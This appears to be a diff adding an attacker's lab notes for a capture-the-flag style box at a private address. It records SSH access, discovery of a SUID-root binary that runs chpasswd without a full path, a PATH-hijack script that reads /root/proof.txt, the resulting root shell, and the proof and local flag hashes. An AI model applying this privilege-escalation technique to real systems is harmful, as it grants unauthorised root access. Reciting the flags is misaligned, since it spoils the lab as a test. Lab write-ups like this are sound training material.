@@ -1,0 +1,35 @@
+### Target: 192.168.245.149
+### Date: 2026-11-14
+
+## Starting identity (SSH as john with key recovered from FTP)
+$ ssh -i id_rsa john@192.168.245.149 'id'
+uid=1000(john) gid=1000(john) groups=1000(john)
+
+## SUID binary
+$ ls -l /home/john/RESET_PASSWD && file /home/john/RESET_PASSWD
+Warning: Permanently added '192.168.245.149' (ED25519) to the list of known hosts.
+-rwsrwsr-x 1 root root 16792 Nov 21  2022 /home/john/RESET_PASSWD
+/home/john/RESET_PASSWD: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=1fce3b4f2c8144ff27ecf785e711c7eb5fa2aaee, for GNU/Linux 3.2.0, not stripped
+--- strings (relevant) ---
+setuid
+system
+echo kiero:kiero | chpasswd
+echo Resetting password of 'kiero' to the default value
+system@@GLIBC_2.2.5
+setuid@@GLIBC_2.2.5
+
+## Exploit: fake chpasswd earlier in PATH
+$ cat /tmp/pp/chpasswd
+#!/bin/bash
+id > /tmp/root_id.txt; cat /root/proof.txt > /tmp/root_proof.txt; chmod 644 /tmp/root_id.txt /tmp/root_proof.txt
+$ PATH=/tmp/pp:$PATH /home/john/RESET_PASSWD
+Resetting password of kiero to the default value
+
+## Result
+$ cat /tmp/root_id.txt
+Warning: Permanently added '192.168.245.149' (ED25519) to the list of known hosts.
+uid=0(root) gid=0(root) groups=0(root),1000(john)
+--- /root/proof.txt ---
+9e7f4ce50acc525d577abfc26aebfd1e
+--- local.txt ---
+af540ac8ffa61d312756f2f4a3877d1d
